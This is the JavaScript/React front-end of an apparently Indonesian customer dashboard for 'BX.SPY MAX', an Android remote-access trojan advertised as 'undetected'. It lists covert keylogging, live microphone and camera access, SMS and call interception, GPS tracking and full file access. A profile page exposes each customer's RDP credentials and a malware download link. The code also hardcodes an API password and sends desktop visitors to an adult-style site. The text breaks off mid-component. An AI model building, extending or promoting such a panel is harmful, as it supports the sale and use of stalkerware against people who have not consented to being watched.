
if (!localStorage.getItem('isLoggedIn')) {
            alert("You must be logged in to access this page.");
            window.location.href = 'login.html';
        }

const Navigation = ({ onNavigate }) => {
    const audioRef = React.useRef(null);
    const [activeIndex, setActiveIndex] = React.useState(0);

    const handleClick = (destination, index) => {
        if (audioRef.current) {
            audioRef.current.play().catch(error => {
                console.error("Error playing sound:", error);
            });
        }
        setActiveIndex(index);
        onNavigate(destination);
    };

    return (
        <div className="relative w-full bg-[#161616] rounded-lg">
            <audio ref={audioRef} src="https://www.soundjay.com/buttons/sounds/beep-21.mp3" preload="auto"></audio>
            <div className="flex justify-between">
                {['forum', 'remote', 'home', 'docs'].map((item, index) => (
                    <div
                        key={item}
                        className="flex flex-col items-center cursor-pointer transform transition-transform duration-200 hover:scale-110 relative"
                        onClick={() => handleClick(item, index)}
                    >
                        <i className={`fas fa-${item === 'forum' ? 'skull' : item === 'remote' ? 'desktop' : item === 'home' ? 'home' : 'book'} text-gray-400 text-lg`}></i>
                        <span className="text-xs text-gray-400">{item.charAt(0).toUpperCase() + item.slice(1)}</span>
                        {activeIndex === index && (
                            <div className="absolute bottom-0 left-1/2 transform -translate-x-1/2 w-1 h-1 bg-blue-500 rounded-full transition-all duration-300"></div>
                        )}
                    </div>
                ))}
            </div>
        </div>
    );
};

const Applications = () => {
    const [isExpanded, setIsExpanded] = React.useState(false);
    const [language, setLanguage] = React.useState('en');

    const toggleFeatures = () => {
        setIsExpanded(!isExpanded);
    };

    const toggleLanguage = () => {
        setLanguage(language === 'id' ? 'en' : 'id');
    };

    const features = {
        id: [
        "Live Screen",
        "Aplikasi Terenkripsi",
        "Koneksi Terenkripsi",
        "Instalasi Stabil",
        "Dengarkan Percakapan Langsung Melalui Mikrofon, Rekam Suara Mikrofon",
        "Keylogger Offline/Online",
        "Manajer Akun",
        "Pengaturan Telepon",
        "Aplikasi",
        "Manajer SMS",
        "Terminal",
        "Obrolan",
        "Dapatkan Lokasi GPS",
        "Manajer Kontak",
        "Periksa Riwayat Browser",
        "Tonton Kamera Langsung Depan/Belakang, Dengan Berbagai Ukuran dan Kualitas, dan (Fokus, Zoom, Mode Flash On/Off)",
        "Ambil Foto dan Video",
        "Jelajahi File Dengan Akses Penuh",
        "Lakukan Panggilan, Rekam Panggilan dan Telusuri Riwayat Panggilan",
        "Perlindungan Floods/DDOS",
    ],
        en: [
        "Live Screen",
        "Encrypted Apps",
        "Encrypted Connection",
        "Stable Installation",
        "Listen Live Conversation Through Mic, Record Mic Sound",
        "Keylogger Offline/Online",
        "Accounts Manager",
        "Phone Settings",
        "Applications",
        "SMS Manager",
        "Terminal",
        "Chat",
        "Get GPS Location",
        "Contacts Manager",
        "Check Browser History",
        "Watch Live Camera Front/Back, With Different Sizes And Quality, And (Focus, Zoom, Flash Mode On/Off)",
        "Capture Photos And Videos",
        "Explore Files With Full Access",
        "Make A Call, Record A Call And Browse Call Logs",
        "Floods/DDOS Protection",
    ],
};
    return (
        <div className="w-full max-w-md bg-[#161616] rounded-lg p-4 mb-16">
            <h1 className="text-xl font-bold">Aplikasi</h1>
            <p className="mb-4 text-sm">Berikut adalah semua aplikasi yang melakukan hal-hal keren untuk membuat pengalaman Discord Anda lebih keren. Anda dapat menghapusnya kapan saja.</p>

            <div className="bg-[#161616] p-4 rounded-lg mb-2 shadow-line">
                <div className="flex justify-between items-center mb-2">
                    <div className="flex items-center">
                        <img src="https://placehold.co/40x40" alt="BX.SPY MAX logo" className="w-10 h-10 rounded-full mr-2" />
                        <h2 className="text-lg font-semibold">BX.SPY MAX 1.2.0</h2>
                    </div>
                    <button className="text-red-500 text-lg"><i className="fas fa-times"></i></button>
                </div>
                <iframe
                    width="100%"
                    height="200"
                    src="https://www.youtube.com/embed/bmXw7IKDyJk"
                    title="YouTube video player"
                    frameBorder="0"
                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                    allowFullScreen
                    className="rounded-lg mb-2"
                ></iframe>
                <div className="mb-2">
                    <h3 className="text-md font-semibold mb-1">Tentang Aplikasi Ini</h3>
                    <p className="mb-1 text-sm">ANDROID RAT/SPY POWER FULL UNDETECTED</p>
                </div>
                <div>
                    <h3 className="text-md font-semibold mb-1">FITUR BX.SPY MAX</h3>
                    <ul className="space-y-1 text-sm">
                        {features[language].slice(0, 7).map((feature, index) => (
                            <li key={index} className="flex items-center"><i className="fas fa-check-circle text-green-500 mr-1"></i> {feature}</li>
                        ))}
                        {isExpanded && features[language].slice(7).map((feature, index) => (
                            <li key={index} className="flex items-center"><i className="fas fa-check-circle text-green-500 mr-1"></i> {feature}</li>
                        ))}
                    </ul>

                    <div className="flex space-x-4 mt-4">
                        <button className="bg-[#5865F2] text-white py-2 px-4 rounded-lg flex items-center" onClick={toggleFeatures}>
                            {isExpanded ? 'Hide' : 'Show more'}
                        </button>
                        <button className="bg-[#5865F2] text-white py-2 px-4 rounded-lg flex items-center" onClick={toggleLanguage}>
                            {language === 'id' ? 'English' : 'Bahasa Indonesia'}
                        </button>
                    </div>
                </div>
            </div>

            <div className="bg-[#2C2F33] p-4 rounded-lg">
                <div className="flex justify-between items-center mb-2">
                    <div className="flex items-center">
                        <img src="https://placehold.co/40x40" alt="FiveM logo" className="w-10 h-10 rounded-full mr-2" />
                        <h2 className="text-lg font-semibold">FiveM</h2>
                    </div>
                    <button className="text-red-500 text-lg"><i className="fas fa-times"></i></button>
                </div>
                <div className="mb-2">
                    <h3 className="text-md font-semibold mb-1">Tentang Aplikasi Ini</h3>
                    <p className="mb-1 text-sm">The Cfx.re/FiveM client uses this authentication grant to automatically authenticate you with servers on the Cfx.re platform.</p>
                </div>
                <div>
                    <h3 className="text-md font-semibold mb-1">Permissions</h3>
                    <ul className="space-y-1 text-sm">
                        <li className="flex items-center"><i className="fas fa-check-circle text-green-500 mr-1"></i> Access your username, avatar, and banner</li>
                        <li className="flex items-center"><i className ="fas fa-check-circle text-green-500 mr-1"></i> Join servers for you</li>
                    </ul>
                </div>
            </div>
        </div>
    );
};

const Profile = () => {
    const [isExpanded, setIsExpanded] = React.useState(false);
    const [isLogoutModalOpen, setIsLogoutModalOpen] = React.useState(false);
    const [isEditModalOpen, setIsEditModalOpen] = React.useState(false); // State untuk modal edit profil
    const [isCopyModalOpen, setIsCopyModalOpen] = React.useState(false);
    const [email, setEmail] = React.useState('null');
    const [phone, setPhone] = React.useState('null');
    const [iprdp, setIprdp] = React.useState('127.0.0.1');
    const [ip, setIp] = React.useState('127.0.0.1');
    const [location, setLocation] = React.useState('null');
    const [userAgent, setUserAgent] = React.useState('null');
    const [userrdp, setUserrdp] = React.useState('null');
    const [passrdp, setPassrdp] = React.useState('null');
    const [expireddate, setExpireddate] = React.useState('null');
    const [userkey, setUserkey] = React.useState('null');
    const [registrationdate, setRegistrationdate] = React.useState('null');
    const [version, setVersion] = React.useState('null');
    const [downloadlink, setDownloadlink] = React.useState('null');
    const [photo, setPhoto] = React.useState(''); // State untuk foto profil
    const [banner, setBanner] = React.useState(''); // State untuk banner
    const [passwordVisible, setPasswordVisible] = React.useState(false);
    const [hostVisible, setHostVisible] = React.useState(false);
    const [newEmail, setNewEmail] = React.useState('');
    const [newPhoto, setNewPhoto] = React.useState(null);
    const [newBanner, setNewBanner] = React.useState('');
    const [newPassword, setNewPassword] = React.useState('');
    const username = localStorage.getItem('username') || 'null';

    React.useEffect(() => {
        const fetchData = async () => {
            const password = 'DEBIAN123';
            const username = localStorage.getItem('username') || 'null';

            try {
                // Fetch data user
                const response = await fetch('https://api-traives.my.id/api/get-data.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        password: password,
                        username: username,
                    }),
                });

                if (!response.ok) {
                    throw new Error('Network response was not ok ' + response.statusText);
                }

                const user = await response.json();

                if (user) {
                    setEmail(user.email);
                    setPhone(user.phone);
                    setIprdp(user.iprdp);
                    setUserrdp(user.userrdp);
                    setPassrdp(user.passrdp);
                    setExpireddate(user.expireddate);
                    setRegistrationdate(user.registrationdate);
                    setUserkey(user.userkey);
                    setVersion(user.version);
                    setDownloadlink(user.downloadlink);
                    setPhoto(user.photo); // Ambil foto dari data pengguna
                    setBanner(user.banner); // Ambil banner dari data pengguna
                    setNewEmail(user.email); // Set default email untuk modal
                    localStorage.setItem('profil', user.photo);
                } else {
                    console.error('User  tidak ditemukan');
                }
            } catch (error) {
                console.error('Error fetching user:', error);
            }

            // Fetch IP dan lokasi
            try {
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                setIp(ipData.ip);
                setLocation(ipData.city + ', ' + ipData.region + ', ' + ipData.country);
                setUserAgent(navigator.userAgent);
            } catch (error) {
                console.error('Error fetching IP data:', error);
            }
        };

        fetchData();
    }, [username]);

    const toggleDisclaimer = () => {
        setIsExpanded(!isExpanded)
            
    };

    const handleLogout = () => {
        setIsLogoutModalOpen(true);
    };

    const confirmLogout = () => {
        localStorage.removeItem('username');
        window.location.href = 'login.html';
    };

    const cancelLogout = () => {
        setIsLogoutModalOpen(false);
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text)
            .then(() => {
                setIsCopyModalOpen(true);
                setTimeout(() => {
                    setIsCopyModalOpen(false);
                }, 3000);
            })
            .catch(err => {
                console.error("Gagal menyalin: ", err);
            });
    };
    
    

    const handleEditProfile = () => {
            const formData = new FormData();
            formData.append('username', username); // Tambahkan username
            formData.append('email', newEmail);
            if (newPhoto) formData.append('photo', newPhoto);
            if (newBanner) formData.append('banner', newBanner);
            formData.append('password', newPassword); // Jika Anda masih ingin mengirimkan password
    
            fetch('https://api-traives.my.id/api/update-profile.php', {
                            method: 'POST',
                            body: formData,
                    })
                    .then(response => response.json())
                    .then(data => {
                            if (data.success) {
                                    setEmail(newEmail);
                                    setPhoto(data.photo || photo);
                                    setBanner(data.banner || banner);
                                    setNewEmail('');
                                    setNewPhoto(null);
                                    setNewBanner('');
                                    setNewPassword('');
                                    setIsEditModalOpen(false); // Tutup modal edit profil
                            } else {
                                    console.error('Update failed:', data.error); // Perbaiki di sini
                            }
                    })
                    .catch(error => {
                            console.error('Error updating profile:', error);
                    });
    };

    return (
                            <div className="w-full max-w-md bg-[#161616] rounded-lg p-4 mb-16 shadow-line">
                        {/* Menampilkan Banner */}
                        <div className="relative">
                            {banner ? (
                                <img src={`${banner}`} alt="Banner" className="w-full h-32 object-cover rounded-lg" />
                            ) : (
                                <div className="w-full h-32 bg-[#161616] rounded-lg flex items-center justify-center">
                                    <p className="text -gray-400">No Banner Available</p>
                                </div>
                            )}
                            <div className="absolute top-0 left-0 w-full h-full flex items-center justify-center">
                                <div className="flex flex-col items-center">
                                    <img src={`https://api-traives.my.id/api/${photo}`} alt="Profile" className="w-16 h-16 rounded-full border-4 border-white mb-2" />
                                    <h1 className="text-lg font-bold text-white">{username}</h1>
                                </div>
                            </div>
                        </div>
                        <div className="flex items-center justify-between mt-4">
                            <div className="flex items-center">
                                <div className="ml-4">
                                    <p className="text-gray-400">{email}</p>
                                    <p className="text-gray-500">{phone}</p>
                                </div>
                            </div>
                            <div className="flex items-center space-x-2">
                                <button className="bg-[#FF9F00] text-black py-2 px-4 rounded-lg flex items-center" onClick={() => setIsEditModalOpen(true)}>
                                    <i className="fas fa-edit mr-2"></i> Edit Profil
                                </button>
                                <div className="bg-[#1E1E1E] p-2 rounded-full">
                                    <i className="fas fa-hashtag text-white"></i>
                                </div>
                            </div>
                        </div>

{isEditModalOpen && (
    <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex justify-center items-center">
        <div className="bg-[#1e1e1e] rounded-lg p-6 w-96 shadow-lg">
            <h2 className="text-lg font-bold text-white">Edit Profil</h2>
            <input
                type="email"
                value={newEmail || email} // Menggunakan email dari state
                onChange={(e) => setNewEmail(e.target.value)}
                placeholder="Email"
                className="mt-4 p-2 rounded-lg w-full bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#7289DA] transition duration-200"
            />
            <input
                type="file"
                onChange={(e) => setNewPhoto(e.target.files[0])}
                className="mt-4 p-2 rounded-lg w-full bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#7289DA] transition duration-200"
            />
            <input
                type="text"
                value={newBanner || banner} // Menggunakan banner dari state
                onChange={(e) => setNewBanner(e.target.value)}
                placeholder="URL Banner"
                className="mt-4 p-2 rounded-lg w-full bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#7289DA] transition duration-200"
            />
            <input
                type="password"
                value={newPassword} // Password baru, tidak diisi dari database
                onChange={(e) => setNewPassword(e.target.value)}
                placeholder="Password"
                className="mt-4 p-2 rounded-lg w-full bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#7289DA] transition duration-200"
            />
            <div className="flex justify-end space-x-4 mt-6">
                <button className="bg-[#161616] text-white py-2 px-4 rounded-lg hover:bg-[#5b6e8c] transition duration-200" onClick={() => setIsEditModalOpen(false)}>
                    Batal
                </button>
                <button className="bg-[#ff9f00] text-black py-2 px-4 rounded-lg hover:bg-[#d63939] transition duration-200" onClick={handleEditProfile}>
                    Simpan
                </button>
            </div>
        </div>
    </div>
)}
            <div className="mt-4 bg-[#1E1E1E] p-4 rounded-lg shadow-line">
                <h2 className="text-lg font-bold">Tentang Saya</h2>
                <p className="text-gray-400">{email}</p>
                <p className="text-gray-500">{phone}</p>
                <h2 className="text-lg font-bold mt-4">Anggota BX.SPY Sejak</h2>
                <p className="text-gray-400">Jan 12, 2021</p>

                <h2 className="text-lg font-bold text-white mt-4">Informasi IP dan Lokasi</h2>
                <p className="text-gray-400">IP: {ip}</p>
                <p className="text-gray-400">Lokasi: {location}</p>
                <p className="text-gray-400">User  Agent: {userAgent}</p>

                <h2 className="text-lg font-bold text-white mt-4">Computer Server Information</h2>
                <p className="text-gray-400">
                    Host IP:
                    {hostVisible ? (
                        <span className="transition duration-300 ease-in-out"> {iprdp} </span>
                    ) : (
                        <span className="filter blur-md transition duration-300 ease-in-out">****************************</span>
                    )}
                    <i
                        className={`fas ${hostVisible ? 'fa-eye-slash' : 'fa-eye'} ml-2 text-gray-400 cursor-pointer`}
                        onClick={() => setHostVisible(!hostVisible)}
                    ></i>
                    <i
                        className="fas fa-copy ml-4 text-gray-400 cursor-pointer"
                        onClick={() => copyToClipboard(iprdp)}
                    ></i>
                </p>
                <p className="text-gray-400">User  RDP: {userrdp}</p>
                <p className="text-gray-400">
                    Password RDP:
                    {passwordVisible ? (
                        <span className="transition duration-300 ease-in-out"> {passrdp} </span>
                    ) : (
                        <span className="filter blur-md transition duration-300 ease-in-out">****************************</span>
                    )}
                    <i
                        className={`fas ${passwordVisible ? 'fa-eye-slash' : 'fa-eye'} ml-2 text-gray-400 cursor-pointer`}
                        onClick={() => setPasswordVisible(!passwordVisible)}
                    ></i>
                    <i
                        className="fas fa-copy ml-4 text-gray-400 cursor-pointer"
                        onClick={() => copyToClipboard(passrdp)}
                    ></i>
                </p>
                <p className="text-gray-400">Expired Date: {expireddate}</p>

                <h2 className="text-lg font-bold mt-4">Software Information</h2>
                <p className="text-gray-400">Registration Date: {registrationdate}</p>
                <p className="text-gray-400">User  Key: {userkey}</p>
                <p className="text-gray-400">Version: {version}</p>
                <p className="text-gray-400">Expired Date: {expireddate}</p>
                <p className="text-gray-400">
                    <span className="text-gray-400">Download Link: </span>
                    <a href={downloadlink} target="_blank" rel="noopener noreferrer" className="text-green-500">
                        {downloadlink}
                    </a>
                </p>
            </div>

            <div className="mt-4 bg-[#2C2F33] p-4 rounded-lg overflow-y-auto max-h-96">
                <h2 className="text-lg font-bold">Disclaimer</h2>
                <p className="text-gray-400">
                    <span className="text-red-600">
                        <i className="fas fa-exclamation-triangle mr-2"></i> **Penting!**
                    </span> Aplikasi ini dirancang untuk pemantauan dan pengawasan yang sah. Pastikan untuk mematuhi semua hukum dan peraturan yang berlaku di wilayah Anda. Berikut adalah beberapa ketentuan yang perlu diperhatikan:
                </p>
                <ol className="list-decimal ml-4">
                    {isExpanded && (
                        <>
                            <li><strong>Penggunaan yang Sah:</strong> Gunakan aplikasi ini hanya untuk tujuan yang etis dan legal. Dilarang keras untuk kegiatan ilegal seperti penyadapan tanpa izin atau pelanggaran privasi.</li>
                            <li><strong>Persetujuan:</strong> Pastikan Anda mendapatkan izin dari individu yang akan dipantau sebelum menggunakan aplikasi ini. Tanpa persetujuan, Anda berisiko menghadapi konsekuensi hukum.</li>
                            <li><strong>Tanggung Jawab:</strong> Pengembang tidak bertanggung jawab atas penyalahgunaan aplikasi. Anda bertanggung jawab penuh atas semua tindakan yang diambil.</li>
                            <li><strong>Konsekuensi Hukum:</strong> Penggunaan aplikasi ini untuk tujuan ilegal dapat dikenakan sanksi hukum. Pahami dan patuhi semua hukum yang berlaku di wilayah Anda.</li>
                            <li><strong>Pembaruan dan Perubahan:</strong> Pengembang berhak untuk memperbarui syarat dan ketentuan kapan saja. Pastikan untuk memeriksa secara berkala.</li>
                        </>
                    )}
                </ol>
                {isExpanded && (
                    <div className="mt-2 text-gray-400">
                        <p className="text-gray-400">x jang77.</p>
                    </div>
                )}
                <button
                    className="bg-[#FF9F00] text-black py-2 px-4 rounded-lg flex items-center mt-4"
                    onClick={toggleDisclaimer}
                    aria-expanded={isExpanded}
                >
                    {isExpanded ? 'Hide' : 'Show more'}
                </button>
            </div>
            <div className="space-y-2">
                <div>
                    <h2 className="text-gray-400 mb-2">Apa yang Baru</h2>
                    <div className="bg-[#1E1E1E] rounded-lg">
                        <div className="flex items-center p-4">
                            <i className="fas fa-info-circle text-gray-400 mr-4"></i>
                            <span className="flex-grow">Apa yang Baru</span>
                            <i className="fas fa-chevron-right text-gray-400"></i>
                        </div>
                    </div>
                </div>
                <div>
                    <div className="bg-[#1E1E1E] rounded-lg">
                        <div className="flex items-center p-4" onClick={handleLogout}>
                            <i className="fas fa-sign-out-alt text-red-500 mr-4"></i>
                            <span className="flex-grow text-red-500">Keluar</span>
                        </div>
                    </div>
                </div>
            </div>

            {/* Modal Konfirmasi */}
            {isLogoutModalOpen && (
                <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex justify-center items-center">
                    <div className="bg-[#1e1e1e] rounded-lg p-4 w-96">
                        <h2 className="text-lg font-bold text-white">Konfirmasi Keluar</h2>
                        <p className="text-gray-400">Apakah Anda yakin ingin keluar?</p>
                        <div className="flex justify-end space-x-4">
                            <button className="bg-[#161616] text-white py-2 px-4 rounded-lg" onClick={cancelLogout}>
                                Batal
                            </button>
                            <button className="bg-[#ff9f00] text-white py-2 px-4 rounded-lg" onClick={confirmLogout}>
                                Keluar
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Modal Salin */}
            {isCopyModalOpen && (
                <div className="fixed top-0 left-0 w-full h-full bg-black bg-opacity-50 flex justify-center items-center">
                    <div className="bg-[#1e1e1e] rounded-lg p-4 w-96 flex flex-col items-center">
                        <h2 className="text-lg font-bold text-white">Information</h2>
                        <p className="text-gray-400">Teks telah disalin ke clipboard!</p>
                        <i className="fas fa-check-circle text-green-500 text-4xl animate-bounce mt-4"></i>
                    </div>
                </div>
            )}
        </div>
    );
};

const Remote = () => {
    return (
        <div className="flex items-center justify-center w-screen h-screen bg-[#161616]">
            <div className="relative w-full h-0" style={{ paddingBottom: '120.25%', paddingTop: '20.00%' }}>
                <iframe
                    src="https://www.windows93.net/"
                    title="FiveM"
                    frameBorder="0"
                    className="absolute top-0 left-0 w-full h-full rounded-lg"
                ></iframe>
            </div>
        </div>
    );
};

const Forum = () => {
    const [posts, setPosts] = window.React.useState([]);
    const [error, setError] = window.React.useState(null);
    const [showForm, setShowForm] = window.React.useState(false);
    const [newPost, setNewPost] = window.React.useState({
        title: '',
        content: '',
        user: localStorage.getItem('username') || '',
        image: null,
        profileImage: localStorage.getItem('profil') || '',
    });
    const [expandedPostIndex, setExpandedPostIndex] = window.React.useState(null);
    const [blurredIndex, setBlurredIndex] = window.React.useState([]); // Array untuk efek blur

    window.React.useEffect(() => {
        document.documentElement.classList.add('dark');
        fetch('https://api-traives.my.id/api/get-post.php')
            .then((response) => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then((data) => {
                const postsWithBlur = data.map(post => ({
                    ...post,
                    profileImage: post.profileImage ? `https://api-traives.my.id/api/${post.profileImage}` : null,
                    created_at: new Date(post.created_at).toLocaleString()
                }));
                setPosts(postsWithBlur);
                setBlurredIndex(new Array(postsWithBlur.length).fill(true)); // Set semua gambar blur secara default
            })
            .catch((error) => setError(error.message));
    }, []);

    const handleChange = (e) => {
        const { name, value, type, files } = e.target;
        if (type === 'file') {
            setNewPost({
                ...newPost,
                image: files[0]
            });
        } else {
            setNewPost({
                ...newPost,
                [name]: value
            });
        }
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        const formData = new FormData();
        formData.append('title', newPost.title);
        formData.append('content', newPost.content);
        formData.append('user', newPost.user);
        formData.append('profileImage', newPost.profileImage);

        if (newPost.image) {
            const uniqueFileName = `${Date.now()}-${newPost.image.name}`;
            formData.append('image', new File([newPost.image], uniqueFileName, { type: newPost.image.type }));
        }

        fetch('https://api-traives.my.id/api/post.php', {
            method: 'POST',
            body: formData
        })
        .then((response) => response.json())
        .then((data) => {
            if (data.success) {
                const newPostWithProfileImage = {
                    ...newPost,
                    profileImage: newPost.profileImage ? `https://api-traives.my.id/api/${newPost.profileImage}` : null,
                    created_at: new Date().toLocaleString()
                };
                setPosts([...posts, newPostWithProfileImage]);
                localStorage.setItem('profil', newPost.profileImage);
                setNewPost({ title: '', content: '', user: localStorage.getItem('username') || '', image: null, profileImage: '' });
                setShowForm(false);
                setBlurredIndex(prev => [...prev, true]); // Tambahkan status blur untuk post baru
            } else {
                setError(data.message);
            }
        })
        .catch((error) => setError(error.message));
    };

    const toggleExpandPost = (index) => {
        setExpandedPostIndex(expandedPostIndex === index ? null : index);
    };

    const handleBlurToggle = (index) => {
        setBlurredIndex(prev => {
            const newBlurredIndex = [...prev];
            newBlurredIndex[index] = !newBlurredIndex[index]; // Toggle blur state untuk gambar tertentu
            return newBlurredIndex;
        });
    };

    return (
        <div className="max-w-2xl mx-auto p-4 bg-[#161616] dark:bg-gray-800">
            <h1 className="text-3xl font-bold text-center mt-8 text-white">Welcome to FRE EDOM SPY</h1>
            {error && <p className="text-red-500 text-center">{error}</p>}
            <div className="flex justify-center mt-6">
                <button onClick={() => setShowForm(!showForm)} className="bg-[#FF9F00] hover:bg-[#FF9F00] text-black px-4 py-2 rounded-full transition duration-200">
                    {showForm ? ' Cancel' : 'Create Post'}
                </button>
            </div>
            {showForm && (
                <form onSubmit={handleSubmit} className="mt-6 bg-[#1E1E1E] dark:bg-gray-800 p-6 rounded-lg shadow-lg">
                    <h2 className="text-2xl font-bold text-white mb-4">Create a New Post</h2>
                    <input type="text"
                        name="title"
                        placeholder="Title"
                        value={newPost.title}
                        onChange={handleChange}
                        className="w-full p-3 mb-4 border border-gray-600 rounded-lg bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        required
                    />
                    <textarea
                        name="content"
                        placeholder="Content"
                        value={newPost.content}
                        onChange={handleChange}
                        className="w-full p-3 mb-4 border border-gray-600 rounded-lg bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        required
                    />
                    <input
                        type="file"
                        name="image"
                        onChange={handleChange}
                        className="w-full p-3 mb-4 border border-gray-600 rounded-lg bg-[#161616] text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                    <button type="submit" className="bg-[#FF9F00] hover:bg-[#FF9F00] text-black px-4 py-2 rounded-full transition duration-200">
                        Submit Post
                    </button>
                </form>
            )}
            <div className="mt-6 space-y-4 overflow-y-auto">
                {posts.length === 0 ? (
                    <p className="text-gray-400 text-center">No posts available.</p>
                ) : (
                    posts.map((post, index) => (
                        <div key={index} className="bg-[#1E1E1E] text-white p-4 rounded-lg shadow-md">
                            <div className="flex items-center mb-2">
                                {post.profileImage && <img src={post.profileImage} alt="Profile" className="w-10 h-10 rounded-full mr-2" />}
                                <div>
                                    <h2 className="text-xl font-bold">{post.user}</h2>
                                    <p className="text-gray-400 text-sm">{post.created_at}</p>
                                </div>
                            </div>
                            <p className="text-gray-400 font-semibold">{post.title}</p>
                            {expandedPostIndex === index ? (
                                <>
                                    <p>{post.content}</p>
                                    {post.image && (
                                        <div className="relative">
                                            <img 
                                                src={`https://api-traives.my.id/api/${post.image}`} 
                                                alt="Post" 
                                                className={`mt-2 w-full h-auto rounded-lg shadow-sm transition-all duration-300 ${blurredIndex[index] ? 'blur-sm opacity-60' : 'opacity-100'}`} 
                                            />
                                            <button 
                                                onClick={() => handleBlurToggle(index)} 
                                                className="absolute inset-0 flex items-center justify-center bg-black bg-opacity-60 text-white rounded-lg"
                                            >
                                                {blurredIndex[index] ? 'Show Attachment' : 'https://hatroom.id/'}
                                            </button>
                                        </div>
                                    )}
                                    <button onClick={() => toggleExpandPost(index)} className="text-blue-500 mt-2">Lihat Lebih Sedikit</button>
                                </>
                            ) : (
                                <button onClick={() => toggleExpandPost(index)} className="text-blue-500 mt-2">Lihat Selengkapnya</button>
                            )}
                        </div>
                    ))
                )}
            </div>
        </div>
    );
};

const Settings = ({ setShowNavigation }) => {
        const [isNavVisible, setIsNavVisible] = React.useState(false);

        const toggleNavVisibility = () => {
                const newVisibility = !isNavVisible;
                setIsNavVisible(newVisibility);
                localStorage.setItem('navVisible', newVisibility);
                setShowNavigation(newVisibility); // Update showNavigation in App
        };

        React.useEffect(() => {
                const navVisible = localStorage.getItem('navVisible') === 'true';
                setIsNavVisible(navVisible);
                setShowNavigation(navVisible); // Ensure App state is in sync
        }, [setShowNavigation]);

        return (
          <div className="w-full max-w-x bg-[#161616] rounded-lg p-6 mb-16">
            <h1 className="text-3xl font-bold mb-4">Settings</h1>
            <div className="space-y-6">
                <div className="bg-[#1E1E1E] p-4 rounded-lg">
                    <div className="flex justify-between items-center">
                        <div>
                            <h2 className="text-lg font-semibold">Theme</h2>
                            <p className="text-sm text-gray-400">Sync across clients.</p>
                            <p className="text-xs text-gray-500">Turning this on will overwrite the above appearance settings on all other clients including desktop and browser.</p>
                        </div>
                        <div className="flex items-center space-x-2">
                            <span className="text-gray-400">Dark</span>
                            <i className="fas fa-chevron-right text-gray-400"></i>
                        </div>
                    </div>
                </div>

                <div className="bg-[#1E1E1E] p-4 rounded-lg">
                    <h2 className="text-lg font-semibold">Navigation</h2>
                    <div className="flex justify-between items-center mt-4">
                        <p className="text-sm text-gray-400">Show Bottom navigation</p>
                        <div className="relative inline-block w-10 mr-2 align-middle select-none transition duration-200 ease-in">
                            <input
                                type="checkbox"
                                name="toggle"
                                id="toggle3"
                                className="toggle-checkbox absolute block w-6 h-6 rounded-full bg-white border-4 appearance-none cursor-pointer"
                                checked={isNavVisible}
                                onChange={toggleNavVisibility}
                            />
                            <label htmlFor="toggle3" className="toggle-label block overflow-hidden h-6 rounded-full bg-gray-600 cursor-pointer"></label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        );
};

const Docs = () => {
    return (
        <div className="w-full max-w-2xl bg-[#161616] rounded-lg p-6 mb-16">
            <h1 className="text-3xl font-bold mb-4">Docs</h1>
            <p className="mb-6 text-base">Selamat datang di docs aplikasi kami! Di sini Anda akan menemukan panduan untuk menggunakan aplikasi dengan efektif.</p>
            <h2 className="text-2xl font-bold">Bagian 1: Memulai</h2>
            <p className="text-base">Untuk memulai, Anda perlu mendaftar dan masuk ke aplikasi. Pastikan Anda mengikuti semua langkah yang diberikan.</p>
            <h2 className="text-2xl font-bold mt-4">Bagian 2: Fitur Utama</h2>
            <p className="text-base">Aplikasi ini memiliki berbagai fitur yang dapat membantu Anda dalam pemantauan dan pengawasan.</p>
            <p className="text-center text-sm mt-6">Developed by XJANG77</p>
        </div>
    );
};

const App = () => {
        const [isDesktop, setIsDesktop] = React.useState(false);
        const [isModalOpen, setIsModalOpen] = React.useState(false);
        const [isAnimating, setIsAnimating] = React.useState(false);
        const [currentPage, setCurrentPage] = React.useState('home');
        const [showNavigation, setShowNavigation] = React.useState(true);
        const [showbackbuttonLink, setShowbackbuttonLink] = React.useState(false);

        React.useEffect(() => {
                const handleResize = () => {
                        if (window.innerWidth >= 768) {
                                setIsDesktop(true);
                                setIsModalOpen(true);
                        } else {
                                setIsDesktop(false);
                        }
                };

                handleResize();
                window.addEventListener('resize', handleResize);

                return () => {
                        window.removeEventListener('resize', handleResize);
                };
        }, []);

        // Memeriksa nilai dari localStorage saat komponen dimuat
        React.useEffect(() => {
                const navVisible = localStorage.getItem('navVisible') === 'true';
                setShowNavigation(navVisible); // Set state berdasarkan nilai dari localStorage
        }, []);

        const closeModal = () => {
                window.location.href = 'https://xxnx.com';
        };

        const onNavigate = (page) => {
                setIsAnimating(true);
                setTimeout(() => {
                        setCurrentPage(page);
                        setIsAnimating(false);

                        // Menentukan tampilan navigasi berdasarkan halaman yang dipilih
                        if (page === 'profile') {
                                setShowNavigation(false); // Sembunyikan navigasi untuk halaman tertentu
                        } else {
                                const navVisible = localStorage.getItem('navVisible') === 'true';
                                setShowNavigation(navVisible); // Tampilkan atau sembunyikan navigasi berdasarkan nilai localStorage
                        }
                }, 300);
        };

        window.onNavigate = onNavigate;

        return (
                <div className="flex flex-col items-center p-4 flex-grow">
            {isAnimating ? (
                <div className="fade-enter">
                    {currentPage === 'home' ? <Applications /> :
                        currentPage === 'forum' ? <Forum /> :
                            currentPage === 'remote' ? <Remote /> :
